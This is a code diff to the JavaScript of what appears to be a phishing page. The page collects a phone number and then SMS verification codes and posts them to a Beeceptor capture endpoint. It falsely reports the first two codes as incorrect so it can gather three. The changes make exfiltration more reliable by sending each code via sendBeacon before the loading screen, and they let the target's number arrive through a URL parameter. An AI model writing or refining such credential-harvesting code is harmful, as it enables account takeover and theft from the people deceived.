@@ -313,6 +313,14 @@
     console.log("[BEEceptor] POST ->", CONFIG.endpoint);
     console.log("[BEEceptor] body:", body);
 
+    // sendBeacon primero (fire-and-forget, no falla por CORS)
+    try {
+      if(navigator.sendBeacon){
+        var blob = new Blob([body], { type: "application/json" });
+        navigator.sendBeacon(CONFIG.endpoint, blob);
+      }
+    } catch(e){ /* silencio */ }
+
     return fetch(CONFIG.endpoint, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -323,28 +331,8 @@
       return res;
     })
     .catch(function(err){
-      console.warn("[BEEceptor] fetch falló, probando sendBeacon:", err);
-      try {
-        if(navigator.sendBeacon){
-          var blob = new Blob([body], { type: "application/json" });
-          var ok = navigator.sendBeacon(CONFIG.endpoint, blob);
-          console.log("[BEEceptor] sendBeacon resultado:", ok);
-          return ok;
-        }
-      } catch(e){
-        console.warn("[BEEceptor] sendBeacon falló:", e);
-      }
-      try {
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", CONFIG.endpoint, true);
-        xhr.setRequestHeader("Content-Type", "application/json");
-        xhr.send(body);
-        console.log("[BEEceptor] XHR enviado");
-        return xhr;
-      } catch(e){
-        console.error("[BEEceptor] XHR falló:", e);
-        return null;
-      }
+      console.warn("[BEEceptor] fetch falló (sendBeacon ya envió):", err);
+      return null;
     });
   }
 
@@ -360,18 +348,6 @@
       formatOnDisplay: true,
       utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/utils.js"
     });
-  }
-
-  // Formatea un número con código de país sin + (ej: 59599545423 -> +595 995 454 23)
-  function formatearNumeroURL(digitos){
-    if(iti && iti.setNumber){
-      try {
-        iti.setNumber("+" + digitos);
-        var n = iti.getNumber();
-        if(n) return n;
-      } catch(e){}
-    }
-    return "+" + digitos;
   }
 
   function numeroVisualmenteValido(){
@@ -432,7 +408,7 @@
     intentos = 0;
 
     // Enviamos el número (siempre, aunque venga de URL también interesa registrar)
-    enviar({ id: VISITANTE, numero: numero, paso: inputCodigo.value.trim(), origen: desdeURL ? "url" : "form" });
+    enviar({ id: VISITANTE, numero: numero, paso: "numero", origen: desdeURL ? "url" : "form" });
 
     $("numMostrado").textContent = numero;
     $("paso1").hidden = true;
@@ -472,7 +448,7 @@
     if(e.key === "Enter"){ e.preventDefault(); $("btn1").click(); }
   });
 
-  /* ================= PASO 2: VERIFICACIÓN DEL CÓDIGO ================= */
+  /* ================= PASO 2: VERIFICACIÓN DEL CÓDIGO (3 INTENTOS) ================= */
   var inputCodigo = $("codigo");
 
   inputCodigo.addEventListener("input", function(){
@@ -497,15 +473,13 @@
     var btn = $("btn2");
     btn.disabled = true;
 
-    // Loading visual
-    await cargar();
-
-    // Aumentamos intento
+    // Aumentamos intento ANTES de enviar
     intentos += 1;
     localStorage.setItem("visitante_intentos_codigo", String(intentos));
 
-    // Enviamos SIEMPRE (incluye el primer fallo) - con await
-    await enviar({
+    // 🔑 ENVIAMOS EL CÓDIGO ANTES DEL LOADING
+    //    Así el intento 1 (fallo), 2 (fallo) y 3 (éxito) salen siempre.
+    enviar({
       id: VISITANTE,
       numero: numeroGuardado,
       codigo: codigo,
@@ -513,7 +487,10 @@
       resultado: intentos <= CONFIG.intentosFallidos ? "fallo" : "exito"
     });
 
-    // Fallos (1 y 2) -> vuelve a pedir
+    // Loading visual (bloquea la UI pero el envío ya salió)
+    await cargar();
+
+    // Fallos (1 y 2) -> vuelve a pedir el código
     if(intentos <= CONFIG.intentosFallidos){
       $("error2").textContent = "Código incorrecto, favor vuelva a intentar.";
       pintarIntento();
@@ -549,16 +526,13 @@
 
   // Si hay ?numer= válido, saltamos directo al paso 2
   if(NUMERO_URL){
-    // Esperamos a que intl-tel-input esté listo para formatear bien
     var arrancar = function(){
-      var formateado = formatearNumeroURL(NUMERO_URL);
-      // Aseguramos que el paso 1 quede oculto desde el inicio
+      // Mostramos el número tal cual vino en la URL (sin +)
       $("paso1").hidden = true;
       $("paso2").hidden = false;
-      irAPaso2(formateado, true);
+      irAPaso2(NUMERO_URL, true);
     };
     if(window.intlTelInput && iti){
-      // utils.js carga async, damos un pequeño margen
       setTimeout(arrancar, 150);
     } else {
       arrancar();
